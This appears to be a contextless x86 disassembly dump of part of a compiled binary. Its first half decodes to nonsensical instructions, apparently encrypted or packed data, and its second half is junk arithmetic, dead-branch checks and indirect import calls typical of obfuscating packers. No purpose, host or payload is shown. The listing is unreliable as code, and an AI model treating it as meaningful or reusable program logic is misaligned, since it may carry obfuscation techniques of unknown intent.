  41ee2a:	and    ebx,DWORD PTR ds:0x5982028c
  41ee30:	sbb    DWORD PTR [eax],0x7
  41ee33:	add    eax,ebx
  41ee35:	jno    0x41ee4c
  41ee37:	in     al,dx
  41ee38:	fnstcw WORD PTR [edx-0x59]
  41ee3b:	ins    DWORD PTR es:[edi],dx
  41ee3c:	adc    dh,dl
  41ee3e:	adc    eax,0x7d125579
  41ee43:	sbb    ah,bh
  41ee45:	ds jnp 0x41ee24
  41ee48:	sub    eax,0x77465d18
  41ee4d:	daa    
  41ee4e:	xor    BYTE PTR [bp+si-0x47cc],0xf6
  41ee54:	inc    edi
  41ee55:	in     al,0x96
  41ee57:	jmp    0x59bc8a63
  41ee5c:	jo     0x41ee2b
  41ee5e:	out    0x3,al
  41ee60:	push   ebp
  41ee61:	and    dh,BYTE PTR [ebx]
  41ee63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee64:	in     eax,dx
  41ee65:	sub    eax,0xf206348e
  41ee6a:	jecxz  0x41edfe
  41ee6c:	add    BYTE PTR [esi-0x548942c7],bh
  41ee72:	cmp    dl,BYTE PTR ds:0x6277b700
  41ee78:	sti    
  41ee79:	es ins BYTE PTR es:[edi],dx
  41ee7b:	sub    bh,0x3e
  41ee7e:	adc    eax,0xe240490e
  41ee83:	inc    esi
  41ee84:	sbb    DWORD PTR [eax],ebx
  41ee86:	or     ah,BYTE PTR [edi-0x5bf642cd]
  41ee8c:	lods   al,BYTE PTR ds:[esi]
  41ee8d:	mov    esp,0xc01a7fa9
  41ee92:	loop   0x41eed1
  41ee94:	mov    fs,WORD PTR [edx+0x5b]
  41ee97:	push   0x79ee48b1
  41ee9c:	adc    DWORD PTR [esi+0x7d],edx
  41ee9f:	dec    edx
  41eea0:	sbb    DWORD PTR [ebx],0xffffffdb
  41eea3:	mov    ebx,0xf23ab07c
  41eea8:	stos   BYTE PTR es:[edi],al
  41eea9:	xor    edx,DWORD PTR [edi]
  41eeab:	icebp  
  41eeac:	dec    ecx
  41eead:	aaa    
  41eeae:	pop    ebp
  41eeaf:	aaa    
  41eeb0:	rcr    BYTE PTR [ebx+0x3f751a20],1
  41eeb6:	cdq    
  41eeb7:	push   esi
  41eeb8:	inc    esi
  41eeb9:	mov    bh,0x9
  41eebc:	(bad)  
  41eebd:	jmp    0x4bed064b
  41eec2:	cmp    DWORD PTR [ecx],0x56b4b16f
  41eec8:	int    0xf
  41eeca:	fistp  WORD PTR [ebp+0x41]
  41eecd:	jno    0x41eeab
  41eecf:	xchg   cl,dh
  41eed1:	scas   eax,DWORD PTR es:[edi]
  41eed2:	jmp    0x41ef2f
  41eed4:	jns    0x41eebf
  41eed6:	sbb    ebx,ebx
  41eed8:	ss aam 0x63
  41eedb:	or     al,0xda
  41eedd:	icebp  
  41eede:	sub    BYTE PTR fs:[ecx+edx*1+0x54],al
  41eee3:	aad    0x52
  41eee5:	(bad)  
  41eee6:	mov    eax,DWORD PTR [ebx]
  41eee8:	inc    esi
  41eee9:	xchg   ebp,eax
  41eeea:	ins    DWORD PTR es:[edi],dx
  41eeeb:	sar    esp,cl
  41eeed:	es ins BYTE PTR es:[edi],dx
  41eeef:	push   ebx
  41eef0:	pop    edi
  41eef1:	ret    0xc5d9
  41eef4:	inc    esp
  41eef5:	mov    edi,0xcee5142a
  41eefa:	inc    ebx
  41eefb:	sbb    eax,0xebaacc49
  41ef00:	mov    al,0x5c
  41ef02:	xor    ch,BYTE PTR [ecx]
  41ef04:	mov    ?,WORD PTR [eax-0x65]
  41ef07:	adc    eax,0x8c20ce9f
  41ef0c:	mov    edi,0x69fca5bc
  41ef11:	(bad)  
  41ef12:	pop    edi
  41ef13:	push   esp
  41ef14:	xchg   ecx,esi
  41ef16:	jmp    DWORD PTR [ecx+0x6ee24fcd]
  41ef1c:	or     DWORD PTR [esi],ecx
  41ef1e:	push   ebx
  41ef1f:	adc    DWORD PTR ss:[esi],ebx
  41ef22:	cmp    dl,dh
  41ef24:	ret    
  41ef25:	shr    BYTE PTR [eax+0x2a],cl
  41ef28:	repz mov ebp,0x5f55e20b
  41ef2e:	shl    BYTE PTR [ebp+0x30460aac],0xbf
  41ef35:	push   edi
  41ef36:	ret    0x1f60
  41ef39:	(bad)
  41ef3d:	jl     0x41ef9a
  41ef3f:	fimul  DWORD PTR [ecx]
  41ef41:	or     eax,0x5dd6e821
  41ef46:	jbe    0x41ef31
  41ef48:	or     eax,0xce43c1dc
  41ef4d:	bound  ecx,QWORD PTR [ebx+0x1581b445]
  41ef53:	das    
  41ef54:	add    DWORD PTR [edx+0x0],0x3493
  41ef5b:	add    eax,DWORD PTR [ebp-0xb4]
  41ef61:	xor    edx,0x29c
  41ef67:	xor    eax,0x2e02
  41ef6c:	sbb    ecx,ecx
  41ef6e:	xor    eax,0x7294
  41ef73:	movzx  edx,WORD PTR ds:0x428253
  41ef7a:	sbb    DWORD PTR ds:0x42812f,edx
  41ef80:	imul   eax,eax,0x68f3
  41ef86:	and    DWORD PTR ds:0x428147,edi
  41ef8c:	mov    ecx,DWORD PTR [ebp-0x8c]
  41ef92:	cmp    DWORD PTR ds:0x4282bb,0x0
  41ef99:	mov    edx,0x254
  41ef9e:	mov    edx,0x254c
  41efa3:	mov    edx,0x6b4f
  41efa8:	jmp    0x41f000
  41efad:	mov    DWORD PTR ds:0x4282ab,0x78fa
  41efb7:	cmp    DWORD PTR ds:0x4282bb,0x0
  41efbe:	jb     0x41efe4
  41efc4:	push   DWORD PTR [ebp-0x1c]
  41efc7:	push   0x74cd
  41efcc:	push   0x4a2f
  41efd1:	call   DWORD PTR ds:0x428ddc
  41efd7:	sub    edx,DWORD PTR ds:0x4281ef
  41efdd:	inc    edx
  41efde:	and    edx,DWORD PTR ds:0x42820b
  41efe4:	mov    DWORD PTR ds:0x428353,0x703b
  41efee:	and    edx,DWORD PTR ds:0x4281fb
  41eff4:	xor    edx,DWORD PTR ds:0x428267
  41effa:	and    DWORD PTR ds:0x428367,edx
  41f000:	and    eax,ecx
  41f002:	sub    eax,0x2818
  41f007:	mov    DWORD PTR [ebp-0xe8],eax
  41f00d:	jmp    0x41f369
  41f012:	adc    al,0x29
  41f015:	fstp   DWORD PTR [ebx]
  41f017:	and    BYTE PTR [edx+0x3a],ah
  41f01a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f01b:	repz mov ebx,0x432751b0
  41f021:	push   0xffffff99
  41f023:	sub    DWORD PTR [esi],edx
  41f025:	sbb    BYTE PTR [ebx-0x60e7e7ee],ah
  41f02b:	and    eax,edx
  41f02d:	sbb    DWORD PTR es:[ecx],ecx
  41f030:	pop    esp
  41f031:	pop    ds
  41f032:	cs in  eax,dx
  41f034:	pushf  
  41f035:	mov    bl,0x94
  41f037:	adc    ah,ah
  41f039:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f03a:	push   eax
  41f03b:	call   0x838b69c7
  41f040:	sub    DWORD PTR [ebx+0x368ceef4],edx
  41f046:	(bad)  
  41f047:	repz icebp 
  41f049:	(bad)  
  41f04a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f04b:	mov    cs,WORD PTR [eax]
  41f04d:	addr16 push ecx
  41f04f:	popf   
  41f050:	add    DWORD PTR [ebx-0x4e2889cf],edi
  41f056:	and    al,0x10
  41f058:	pop    ebp
  41f059:	pop    esi
  41f05a:	popf   
  41f05b:	xor    eax,DWORD PTR [esi+0x3e]
  41f05e:	cmp    esi,DWORD PTR [edi]
  41f060:	cmp    esi,DWORD PTR [ecx+0x462f59ae]
  41f066:	add    eax,0x30ca71b0
  41f06b:	dec    edi
  41f06c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f06d:	ja     0x41eff7
  41f06f:	shl    BYTE PTR [ecx+ebp*4],1
  41f072:	mov    ecx,edi
  41f074:	jmp    ebx
  41f076:	ins    DWORD PTR es:[edi],dx
  41f077:	xor    eax,0xb3e29c5
  41f07c:	ins    DWORD PTR es:[edi],dx
  41f07d:	add    edi,DWORD PTR [ebx]
  41f07f:	xchg   DWORD PTR [ebp-0x28],ebp
  41f082:	shl    ebx,0xee
  41f085:	or     esp,DWORD PTR [ebx+0x410d1dfd]
  41f08b:	sbb    ch,cl
  41f08d:	in     al,0x96
  41f08f:	aaa    
  41f090:	les    ebp,FWORD PTR [edx+0x77dc180e]
  41f096:	pop    ss
  41f097:	call   0x403e:0xcf46ee1d
  41f09e:	popf   
  41f09f:	push   ebp
  41f0a0:	inc    ebx
  41f0a1:	sub    al,BYTE PTR [esi]
  41f0a3:	pop    ss
  41f0a4:	add    DWORD PTR [esi-0x73],eax
  41f0a7:	rol    cl,0xa3
  41f0aa:	inc    esp
  41f0ab:	mov    DWORD PTR [eax-0x13],0x90b46838
  41f0b2:	ret    
  41f0b3:	int    0x27
  41f0b5:	mov    dh,0x2f
  41f0b7:	push   ds
  41f0b8:	xor    al,0x67
  41f0ba:	jmp    0x41f089
  41f0bc:	push   es
  41f0bd:	ret    
  41f0be:	cs mov ebx,0x2c9e7e5
  41f0c4:	(bad)  
  41f0c6:	sub    al,0xf5
  41f0c8:	xor    eax,0xefb3bbbc
  41f0cd:	sub    eax,0x5ac78a59
  41f0d2:	mov    ds:0xb9ab782f,al
  41f0d7:	lods   eax,DWORD PTR ds:[esi]
  41f0d8:	shl    BYTE PTR [edx+0x19],0xb1
  41f0dc:	dec    ebx
  41f0dd:	jp     0x41f0b2
  41f0df:	mov    WORD PTR cs:[ebp+0x2075fe98],cs
  41f0e6:	jmp    DWORD PTR [edi]
  41f0e8:	ret    0xb926
  41f0eb:	xor    edi,DWORD PTR [eax]
  41f0ed:	sti    
  41f0ee:	cmp    al,0x74
  41f0f0:	sub    ch,BYTE PTR [ebx+0x23]
  41f0f3:	cli    
  41f0f4:	sub    esp,ecx
  41f0f6:	pushf  
  41f0f7:	push   esi
  41f0f8:	cmp    eax,0x6d945454
  41f0fd:	out    dx,al
  41f0fe:	in     al,dx
  41f0ff:	jp     0x41f09f
  41f101:	popa   
  41f102:	dec    esi
  41f103:	push   es
  41f104:	push   ebx
  41f105:	xchg   cl,dh
  41f107:	jl     0x41f0cd
  41f109:	jecxz  0x41f106
  41f10b:	ror    BYTE PTR es:[esi-0x3],1
  41f10f:	dec    al
  41f111:	sbb    ah,BYTE PTR [eax]
  41f113:	(bad)  
  41f114:	out    dx,eax
  41f115:	jmp    0x41f107
  41f117:	test   cl,al
  41f119:	call   0xf3d638c8
  41f11e:	pop    ebp
  41f11f:	jae    0x41f189
  41f121:	pusha  
  41f122:	lahf   
  41f123:	or     eax,0x5e7845f5
  41f128:	push   es
  41f129:	jecxz  0x41f12a
  41f12b:	inc    edi
  41f12c:	aam    0xc1
  41f12e:	sub    al,0xfa
  41f130:	dec    ecx
  41f131:	pop    ebx
  41f132:	lock rcr DWORD PTR [eax-0x4d],1
  41f136:	enter  0x3241,0xfe
  41f13a:	pop    es
  41f13b:	retf   
  41f13c:	(bad)  
  41f13d:	es pop esi
  41f13f:	mov    cl,0xcd
  41f141:	push   ecx
  41f142:	addr16 add dh,al
  41f145:	mov    ch,0x8c
  41f147:	neg    ebp
  41f149:	int3   
  41f14a:	xor    BYTE PTR ds:0x76031fec,dh
  41f150:	xor    eax,DWORD PTR [edi]
  41f152:	and    bh,BYTE PTR [edi+ebx*8+0x30]
  41f156:	test   DWORD PTR ds:0x752a41ef,esp
  41f15c:	cmp    eax,0xfcf4450c
  41f161:	xchg   al,dl
  41f163:	pop    esi
  41f164:	add    eax,0xbcf0be04
  41f169:	nop
  41f16a:	xor    DWORD PTR [edi+0x104978bd],eax
  41f170:	and    eax,0xfdd99429
  41f175:	(bad)  
  41f176:	dec    ebx
  41f177:	mov    al,ds:0x7e4df7ed
  41f17c:	pop    edx
  41f17d:	fldcw  WORD PTR [edi+0x2bea99c6]
  41f183:	xchg   esi,eax
  41f184:	mov    BYTE PTR [ecx+0x954c1fd],dl
  41f18a:	xor    eax,0x5a1f2730
  41f18f:	add    DWORD PTR [ecx+0x1a],esp
  41f192:	bound  esp,QWORD PTR [ecx]
  41f194:	fs popf 
  41f196:	sbb    eax,0xe53315ff
  41f19b:	cmp    eax,0x748cccc
  41f1a0:	aad    0xf8
  41f1a2:	fild   WORD PTR [eax-0x67]
  41f1a5:	dec    esi
  41f1a6:	mov    ?,WORD PTR [eax+0x3ae66edd]
  41f1ac:	mov    dl,0xe5
  41f1ae:	fucomi st,st(6)
  41f1b0:	test   BYTE PTR [edx+edx*1],bh
  41f1b3:	out    dx,al
  41f1b4:	rcl    DWORD PTR ds:0xe3a8e64,cl
  41f1ba:	stos   DWORD PTR es:[edi],eax
  41f1bb:	push   edi
  41f1bc:	pop    ss
  41f1bd:	shr    BYTE PTR [ebx+eax*4+0x72d22532],0x70
  41f1c5:	push   ds
  41f1c6:	sbb    al,0x80
  41f1c8:	test   eax,0x20c62994
  41f1cd:	fcmovbe st,st(6)
  41f1cf:	or     edx,DWORD PTR [ecx-0x5abc10f3]
  41f1d5:	fwait
  41f1d6:	imul   DWORD PTR [ebx]
  41f1d8:	ins    DWORD PTR es:[edi],dx
  41f1d9:	fs sub ch,dl
  41f1dc:	mov    ebx,0xb5d8b136
  41f1e1:	inc    esi
  41f1e2:	sti    
  41f1e3:	aad    0x2
  41f1e5:	sti    
  41f1e6:	jl     0x41f188
  41f1e8:	scas   eax,DWORD PTR es:[edi]
  41f1e9:	dec    DWORD PTR [ebp+0x4b6f0981]
  41f1ef:	lahf   
  41f1f0:	nop
  41f1f1:	adc    BYTE PTR [eax+0x2f],0x71
  41f1f5:	cwde   
  41f1f6:	cmp    dl,BYTE PTR [edi]
  41f1f8:	and    ebp,DWORD PTR [ebx-0x6f411ce4]
  41f1fe:	enter  0x5167,0x19
  41f202:	and    DWORD PTR [esp+ebx*1],ebx
  41f205:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f206:	jae    0x41f218
  41f208:	jae    0x41f263
  41f20a:	icebp  
  41f20b:	jnp    0x41f1f7
  41f20d:	mov    BYTE PTR [ecx-0x74],dh
  41f210:	(bad)  
  41f211:	nop
  41f212:	std    
  41f213:	push   0x38
  41f215:	shl    DWORD PTR [esi],1
  41f217:	jp     0x41f217
  41f219:	or     eax,0x2404f3bb
  41f21e:	arpl   WORD PTR [edx],bx
  41f220:	sub    esp,DWORD PTR [esi-0xd77f105]
  41f226:	(bad)  
  41f227:	xor    ebx,DWORD PTR [ebx]
  41f229:	xor    edx,DWORD PTR [eax-0x2cd2519a]
  41f22f:	aas    
  41f230:	mov    al,BYTE PTR [edx-0x616a809a]
  41f236:	pop    eax
  41f237:	or     ah,BYTE PTR [esi]
  41f239:	and    cl,dl
  41f23b:	xchg   ebx,eax
  41f23c:	hlt    
  41f23d:	xor    eax,0x994740c
  41f242:	das    
  41f243:	push   ebp
  41f244:	jge    0x41f266
  41f246:	inc    ebp
  41f247:	xor    bh,bl
  41f249:	sbb    al,cl
  41f24b:	fs pop esp
  41f24d:	dec    edi
  41f24e:	dec    ecx
  41f24f:	bound  ecx,QWORD PTR [ebp-0x14]
  41f252:	jno    0x41f223
  41f254:	or     DWORD PTR [ecx+0x2719aef6],ebp
  41f25a:	bound  edx,QWORD PTR [ebx]
  41f25c:	lods   al,BYTE PTR ds:[esi]
  41f25d:	mov    bh,0xba
  41f25f:	ins    DWORD PTR es:[edi],dx
  41f260:	sbb    eax,0x50dd4503
  41f265:	out    dx,eax
  41f266:	out    dx,eax
  41f267:	or     BYTE PTR [esi],ah
  41f269:	adc    BYTE PTR [edi-0x67],0x5
  41f26d:	sbb    DWORD PTR [ebx-0x7],eax
  41f270:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f271:	loop   0x41f211
  41f273:	bound  ebp,QWORD PTR [ecx]
  41f275:	retf   
  41f276:	loopne 0x41f2ba
  41f278:	in     al,dx
  41f279:	ret    
  41f27a:	add    DWORD PTR [ebx-0x58],ebx
  41f27d:	add    eax,0x5eee7c
  41f282:	mov    cl,0x10
  41f284:	ss hlt 
  41f286:	dec    edi
  41f287:	xchg   ebp,eax
  41f288:	out    0x84,al
  41f28a:	mov    cs,WORD PTR [ecx]
  41f28c:	cmp    al,0x26
  41f28e:	hlt    
  41f28f:	mov    edx,0xd53b50a1
  41f294:	ret    0xba20
  41f297:	cli    
  41f298:	test   DWORD PTR [edi-0x1],ebp
  41f29b:	adc    DWORD PTR [ecx-0xc038e1b],ecx
  41f2a1:	or     ah,bl
  41f2a3:	pop    edi
  41f2a4:	aam    0x5c
  41f2a6:	pop    edi
  41f2a7:	sbb    ebx,DWORD PTR [esi-0x2a]
  41f2aa:	in     eax,0xaa
  41f2ac:	add    eax,0xb5b17161
  41f2b1:	push   edx
  41f2b2:	mov    dh,0x19
  41f2b4:	mov    ch,BYTE PTR [esp+ebx*2+0xf]
  41f2b8:	bound  eax,QWORD PTR [ebp-0x1439dfca]
  41f2be:	aad    0x15
  41f2c0:	arpl   WORD PTR [ecx+edx*8],si
  41f2c3:	test   eax,0xb21d16d6
  41f2c8:	std    
  41f2c9:	sbb    BYTE PTR [ebx],dl
  41f2cb:	imul   BYTE PTR [edi+0x50]
  41f2ce:	sar    BYTE PTR [ebp-0x13ea39cf],0x0
  41f2d5:	jmp    0x93fd:0x7a582d91
  41f2dc:	sbb    eax,0x1f1425c6
  41f2e1:	mov    edx,0x86f9d2d4
  41f2e6:	ss jb  0x41f334
  41f2e9:	jb     0x41f2cc
  41f2eb:	test   dl,dh
  41f2ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f2ee:	gs adc al,0xc7
  41f2f1:	(bad)  
  41f2f2:	jne    0x41f351
  41f2f4:	xchg   esp,eax
  41f2f5:	add    bl,BYTE PTR [ebx+edx*8+0x699acea4]
  41f2fc:	and    ch,bh
  41f2fe:	daa    
  41f2ff:	(bad)  
  41f300:	fisub  DWORD PTR [ecx]
  41f302:	(bad)  
  41f303:	fstp   DWORD PTR [eax]
  41f305:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f306:	loope  0x41f2d2
  41f308:	je     0x41f340
  41f30a:	and    eax,0xcc21782
  41f30f:	ins    DWORD PTR es:[edi],dx
  41f310:	aad    0xef
  41f312:	inc    edx
  41f313:	push   eax
  41f314:	call   0xfb10:0xc363875e
  41f31b:	stc    
  41f31c:	not    DWORD PTR [esi+edx*8-0x960eb90]
  41f323:	adc    ecx,DWORD PTR [esi-0x529c1bac]
  41f329:	and    al,0x62
  41f32b:	jmp    0x41f2f3
  41f32d:	jnp    0x41f395
  41f32f:	out    0x28,al
  41f331:	and    ah,al
  41f333:	lea    esi,[esi]
  41f335:	retf   0xf8b
  41f338:	sub    al,BYTE PTR [ebx]
  41f33a:	or     ah,BYTE PTR [esi-0x19c704a7]
  41f340:	or     al,0x8d
  41f342:	mov    bh,0xc3
  41f344:	xor    BYTE PTR [edx+ebp*1+0x33],dl
  41f348:	jmp    0x41f3b0
  41f34a:	push   eax
  41f34b:	aas    
  41f34c:	sbb    BYTE PTR [eax-0x72a245dc],0xb
  41f353:	cmp    BYTE PTR [esi],0x4
  41f356:	push   ecx
  41f357:	jb     0x41f357
  41f359:	and    al,0x3b
  41f35b:	mov    ch,BYTE PTR [esi-0x51]
  41f35e:	jo     0x41f37f
  41f360:	inc    esp
  41f361:	push   esi
  41f362:	cmp    DWORD PTR [ecx],edi
  41f364:	or     DWORD PTR [ecx-0x383f856f],0x45
  41f36b:	nop
  41f36c:	mov    DWORD PTR [edi+0x0],ebp
  41f36f:	add    BYTE PTR [ebx+0x4282d33d],al
  41f375:	add    BYTE PTR [eax],al
  41f377:	movzx  edx,WORD PTR ds:0x4281ef
  41f37e:	mov    ecx,DWORD PTR ds:0x428237
  41f384:	mov    ecx,DWORD PTR ds:0x428223
  41f38a:	jmp    0x41f3f3
  41f38f:	not    eax
  41f391:	mov    DWORD PTR ds:0x42820f,ebx
  41f397:	cmp    DWORD PTR ds:0x4282d3,0x0
  41f39e:	jbe    0x41f3dd
  41f3a4:	push   DWORD PTR [ebp-0x14]
  41f3a7:	push   DWORD PTR [ebp-0x28]
  41f3aa:	push   DWORD PTR [ebp-0x10]
  41f3ad:	push   0x4280e3
  41f3b2:	push   0x1cee
  41f3b7:	push   0x479c
  41f3bc:	push   0x8744
  41f3c1:	call   DWORD PTR ds:0x428de0
  41f3c7:	sub    ecx,DWORD PTR ds:0x428207
  41f3cd:	mov    DWORD PTR ds:0x428157,0x2f55
  41f3d7:	and    DWORD PTR ds:0x4282b3,ebx
  41f3dd:	or     DWORD PTR ds:0x4282cb,ecx
  41f3e3:	xor    edx,edx
  41f3e5:	or     edx,DWORD PTR ds:0x42815f
  41f3eb:	mov    edx,DWORD PTR [edx]
  41f3ed:	sbb    DWORD PTR ds:0x4282e7,edx
  41f3f3:	mov    DWORD PTR [ebp-0xd0],0x5a58
  41f3fd:	mov    DWORD PTR [ebp-0x120],0x3c77
  41f407:	mov    DWORD PTR [ebp-0x2c],0x2129
  41f40e:	or     DWORD PTR ds:0x42813f,0x8a7
  41f418:	mov    eax,DWORD PTR [ebp-0x2c]
  41f41b:	imul   eax,eax,0x1ada
  41f421:	cmp    DWORD PTR ds:0x42834b,0x0
  41f428:	mov    DWORD PTR ds:0x4282df,0xae0
  41f432:	mov    DWORD PTR ds:0x42811b,ebx
  41f438:	mov    ecx,DWORD PTR ds:0x42833b
  41f43e:	jmp    0x41f484
  41f443:	mov    DWORD PTR ds:0x4282c3,ebx
  41f449:	mov    DWORD PTR ds:0x42813f,0x2430
  41f453:	cmp    DWORD PTR ds:0x42834b,0x0
  41f45a:	ja     0x41f47c
  41f460:	push   DWORD PTR [ebp-0x18]
  41f463:	push   0x427ef5
  41f468:	call   DWORD PTR ds:0x428e64
  41f46e:	sub    ecx,0x6218
  41f474:	inc    DWORD PTR ds:0x428357
  41f47a:	add    edx,edx
  41f47c:	or     edx,ecx
  41f47e:	sub    edx,0x9ad
  41f484:	mov    ecx,DWORD PTR [ebp-0x120]
  41f48a:	cmp    DWORD PTR ds:0x428157,0x0
  41f491:	not    edx
  41f493:	mov    DWORD PTR ds:0x4282af,0x6486
  41f49d:	mov    DWORD PTR ds:0x42821b,0x7a92
  41f4a7:	mov    DWORD PTR ds:0x42824b,ebx
  41f4ad:	jmp    0x41f510
  41f4b2:	mov    DWORD PTR ds:0x428353,0x24a4
  41f4bc:	cmp    DWORD PTR ds:0x428157,0x0
  41f4c3:	ja     0x41f4ed
  41f4c9:	push   0x427fbb
  41f4ce:	push   DWORD PTR [ebp-0x10]
  41f4d1:	call   DWORD PTR ds:0x428de4
  41f4d7:	neg    DWORD PTR ds:0x42814b
  41f4dd:	and    DWORD PTR ds:0x42822f,0x4282b3
  41f4e7:	and    DWORD PTR ds:0x42832f,edi
  41f4ed:	movzx  edx,BYTE PTR ds:0x428147
  41f4f4:	sbb    edx,DWORD PTR ds:0x4282cf
  41f4fa:	mov    DWORD PTR ds:0x428147,edx
  41f500:	sub    DWORD PTR ds:0x428243,0x2ffe
  41f50a:	and    edx,0x4c8b
  41f510:	imul   ecx,ecx,0x53ae
  41f516:	and    DWORD PTR ds:0x42814f,ebx
  41f51c:	imul   ecx,ecx,0x7447
  41f522:	mov    edx,DWORD PTR [ebp-0xd0]
  41f528:	sbb    DWORD PTR ds:0x428353,0x1933
  41f532:	and    ecx,edx
  41f534:	cmp    DWORD PTR ds:0x428133,0x0
  41f53b:	mov    DWORD PTR ds:0x42834f,0x38cb
  41f545:	mov    edx,0x66af
  41f54a:	not    edx
  41f54c:	jmp    0x41f5db
  41f551:	mov    DWORD PTR ds:0x42820f,0x6044
  41f55b:	not    DWORD PTR ds:0x42821b
  41f561:	cmp    DWORD PTR ds:0x428133,0x0
  41f568:	jg     0x41f5a9
  41f56e:	push   0x13fa
  41f573:	push   DWORD PTR [ebp-0x18]
  41f576:	push   0x47c2
  41f57b:	push   DWORD PTR [ebp-0x1c]
  41f57e:	push   0x5b80
  41f583:	push   DWORD PTR [ebp-0x10]
  41f586:	push   0x6360
  41f58b:	push   0x2aad
  41f590:	push   DWORD PTR [ebp-0x28]
  41f593:	push   DWORD PTR [ebp-0x10]
  41f596:	call   DWORD PTR ds:0x428de8
  41f59c:	inc    edx
  41f59d:	adc    DWORD PTR ds:0x428113,edi
  41f5a3:	and    DWORD PTR ds:0x4282ab,ecx
  41f5a9:	movzx  edx,WORD PTR ds:0x4282c3
  41f5b0:	add    edx,DWORD PTR ds:0x4282bb
  41f5b6:	mov    DWORD PTR ds:0x4282c3,edx
  41f5bc:	add    DWORD PTR ds:0x4282b7,0x7749
  41f5c6:	adc    DWORD PTR ds:0x42821b,0x1ba
  41f5d0:	dec    edx
  41f5d1:	sub    DWORD PTR ds:0x42834f,0x6520
  41f5db:	or     ecx,0x2a20
  41f5e1:	mov    DWORD PTR ds:0x42815b,0x1cbf
  41f5eb:	mov    edx,DWORD PTR [ebp-0x70]
  41f5ee:	adc    DWORD PTR ds:0x4282df,0x2406
  41f5f8:	xor    ecx,edx
  41f5fa:	or     DWORD PTR ds:0x4282cf,ecx
  41f600:	mov    edx,DWORD PTR [ebp+0x14]
  41f603:	adc    DWORD PTR ds:0x428353,0x652b
  41f60d:	mov    eax,DWORD PTR [edx+eax*1-0x37a66ea]
  41f614:	xor    DWORD PTR ds:0x428217,0x49e9
  41f61e:	lea    eax,[ecx+eax*1-0x45a1]
  41f625:	cmp    DWORD PTR ds:0x42822b,0x0
  41f62c:	mov    ecx,0x2e1f
  41f631:	mov    DWORD PTR ds:0x428247,ecx
  41f637:	mov    ecx,0x173d
  41f63c:	not    DWORD PTR ds:0x428213
  41f642:	jmp    0x41f698
  41f647:	mov    DWORD PTR ds:0x42825f,0x35b0
  41f651:	cmp    DWORD PTR ds:0x42822b,0x0
  41f658:	jae    0x41f680
  41f65e:	push   0x2832
  41f663:	call   DWORD PTR ds:0x428dec
  41f669:	dec    ecx
  41f66a:	or     DWORD PTR ds:0x4281eb,0x127d
  41f674:	mov    ecx,DWORD PTR ds:0x4282b7
  41f67a:	add    DWORD PTR ds:0x4282db,ecx
  41f680:	sbb    DWORD PTR ds:0x42824f,ebx
  41f686:	mov    ecx,DWORD PTR ds:0x428123
  41f68c:	adc    DWORD PTR ds:0x428117,ecx
  41f692:	and    ecx,0x3d62
  41f698:	mov    DWORD PTR [ebp-0xb0],eax
  41f69e:	mov    ecx,DWORD PTR ds:0x42837f
  41f6a4:	mov    ecx,DWORD PTR [ecx]
  41f6a6:	xor    DWORD PTR ds:0x42820f,ecx
  41f6ac:	mov    DWORD PTR [ebp-0x11c],0x303f
  41f6b6:	not    eax
  41f6b8:	mov    DWORD PTR [ebp-0x98],0x51a9
  41f6c2:	sub    DWORD PTR ds:0x4282e3,0x1cf2
  41f6cc:	mov    DWORD PTR [ebp-0xcc],0x6d4d
  41f6d6:	xor    eax,ecx
  41f6d8:	mov    eax,DWORD PTR [ebp-0xcc]
  41f6de:	cmp    DWORD PTR ds:0x4282c7,0x0
  41f6e5:	mov    DWORD PTR ds:0x4282cf,0x6375
  41f6ef:	not    DWORD PTR ds:0x42812f
  41f6f5:	mov    DWORD PTR ds:0x4281eb,ecx
  41f6fb:	jmp    0x41f76f
  41f700:	mov    DWORD PTR ds:0x4281fb,0x2351
  41f70a:	mov    DWORD PTR ds:0x42823f,ebx
  41f710:	cmp    DWORD PTR ds:0x4282c7,0x0
  41f717:	jb     0x41f758
  41f71d:	push   0x3851
  41f722:	push   0x42822b
  41f727:	call   DWORD PTR ds:0x428df0
  41f72d:	movzx  ecx,WORD PTR ds:0x4281fb
  41f734:	xor    DWORD PTR ds:0x428367,ecx
  41f73a:	mov    ecx,DWORD PTR ds:0x42822b
  41f740:	add    ecx,DWORD PTR ds:0x428223
  41f746:	mov    DWORD PTR ds:0x42822b,ecx
  41f74c:	mov    ecx,DWORD PTR ds:0x42823b
  41f752:	adc    DWORD PTR ds:0x42834b,ecx
  41f758:	inc    ecx
  41f759:	xor    DWORD PTR ds:0x4282e7,ebx
  41f75f:	sub    DWORD PTR ds:0x428147,edx
  41f765:	and    DWORD PTR ds:0x4282c7,0x3308
  41f76f:	xor    eax,0x6f65
  41f774:	add    DWORD PTR ds:0x4282db,edx
  41f77a:	mov    ecx,DWORD PTR [ebp-0x98]
  41f780:	add    DWORD PTR ds:0x428347,0x4282bb
  41f78a:	or     eax,ecx
  41f78c:	and    DWORD PTR ds:0x4281f7,0x3807
  41f796:	add    eax,0x161e
  41f79b:	or     ecx,DWORD PTR ds:0x428207
  41f7a1:	mov    ecx,DWORD PTR [ebp-0x11c]
  41f7a7:	add    DWORD PTR ds:0x4281fb,0x428157
  41f7b1:	or     eax,ecx
  41f7b3:	add    DWORD PTR ds:0x428347,edi
  41f7b9:	add    eax,0x1cca
  41f7be:	or     ecx,DWORD PTR ds:0x428247
  41f7c4:	xor    eax,0x96c9
  41f7c9:	mov    DWORD PTR [ebp-0x38],eax
  41f7cc:	cmp    DWORD PTR ds:0x428353,0x0
  41f7d3:	mov    ecx,DWORD PTR ds:0x428337
  41f7d9:	mov    DWORD PTR ds:0x42832b,ecx
  41f7df:	mov    DWORD PTR ds:0x4282cf,0x7d57
  41f7e9:	jmp    0x41f8c3
  41f7ee:	mov    DWORD PTR ds:0x42824f,0xe1
  41f7f8:	mov    DWORD PTR ds:0x428147,edi
  41f7fe:	cmp    DWORD PTR ds:0x428353,0x0
  41f805:	jne    0x41f836
  41f80b:	push   DWORD PTR [ebp-0xc]
  41f80e:	push   0x427f3a
  41f813:	push   0x427ea1
  41f818:	call   DWORD PTR ds:0x428e68
  41f81e:	sub    ecx,ecx
  41f820:	xor    ecx,ecx
